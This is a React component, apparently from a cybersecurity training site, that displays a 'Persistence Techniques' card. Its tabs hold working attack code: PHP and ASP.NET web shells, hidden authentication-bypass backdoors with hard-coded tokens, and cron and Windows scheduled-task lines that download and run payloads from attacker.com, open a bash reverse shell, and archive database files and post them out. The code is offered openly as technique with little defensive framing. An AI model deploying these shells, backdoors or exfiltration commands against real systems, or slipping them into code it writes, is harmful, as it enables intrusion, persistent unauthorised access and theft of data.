
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Shield, Server, Code, Database, Globe, Key } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const PersistenceTechniques: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Shield className="h-6 w-6" />
          Persistence Techniques
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="web-shells" className="w-full">
          <TabsList className="grid grid-cols-3 w-full">
            <TabsTrigger value="web-shells">Web Shells</TabsTrigger>
            <TabsTrigger value="backdoors">Backdoors</TabsTrigger>
            <TabsTrigger value="scheduled-tasks">Scheduled Tasks</TabsTrigger>
          </TabsList>

          <TabsContent value="web-shells" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Web Shell Deployment</h3>
            <p className="text-cybr-foreground/80">
              Web shells provide persistent access through web-accessible scripts that allow remote command execution.
            </p>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">PHP Web Shell</h4>
              <CodeExample
                language="php"
                title="Simple PHP Web Shell"
                code={`<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="<?php echo $_SERVER['PHP_SELF']; ?>">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
</BODY></HTML>`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">ASP.NET Web Shell</h4>
              <CodeExample
                language="csharp"
                title="ASP.NET Web Shell"
                code={`<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    if (Request["cmd"] != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form><input name="cmd" type="text" /><input type="submit" value="Execute" /></form>`}
              />
            </div>
          </TabsContent>

          <TabsContent value="backdoors" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Application Backdoors</h3>
            <p className="text-cybr-foreground/80">
              Backdoors embedded within legitimate application code for persistent access.
            </p>

            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Authentication Bypass</h4>
              <CodeExample
                language="php"
                title="Hidden Authentication Bypass"
                code={`// Legitimate login function
function authenticate($username, $password) {
    // Hidden backdoor - check for special parameter
    if (isset($_GET['debug']) && $_GET['debug'] === 'xj9k2m') {
        return true; // Bypass authentication
    }
    
    // Normal authentication logic
    return checkCredentials($username, $password);
}`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Configuration Backdoor</h4>
              <CodeExample
                language="javascript"
                title="Node.js Configuration Backdoor"
                code={`// In config file
const config = {
    database: {
        host: process.env.DB_HOST || 'localhost',
        // Hidden backdoor configuration
        adminBypass: process.env.ADMIN_BYPASS === 'true'
    }
};

// In authentication middleware
function authenticateAdmin(req, res, next) {
    if (config.database.adminBypass && req.headers['x-admin-token'] === 'backdoor123') {
        req.user = { role: 'admin', id: 1 };
        return next();
    }
    // Normal authentication logic
}`}
              />
            </div>
          </TabsContent>

          <TabsContent value="scheduled-tasks" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Scheduled Persistence</h3>
            <p className="text-cybr-foreground/80">
              Using scheduled tasks and cron jobs for persistent access and data exfiltration.
            </p>

            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Cron Job Persistence</h4>
              <CodeExample
                language="bash"
                title="Cron Job for Reverse Shell"
                code={`# Add to crontab for persistence
*/10 * * * * /usr/bin/curl -o /tmp/shell.sh http://attacker.com/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh

# Alternative: Direct reverse shell
*/5 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Stealthy data exfiltration
0 2 * * * find /var/www -name "*.sql" -o -name "*.db" | xargs tar -czf /tmp/data.tar.gz && curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Windows Scheduled Task</h4>
              <CodeExample
                language="batch"
                title="Windows Scheduled Task"
                code={`REM Create scheduled task for persistence
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"" /sc minute /mo 15

REM Alternative: Using PowerShell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate"`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default PersistenceTechniques;
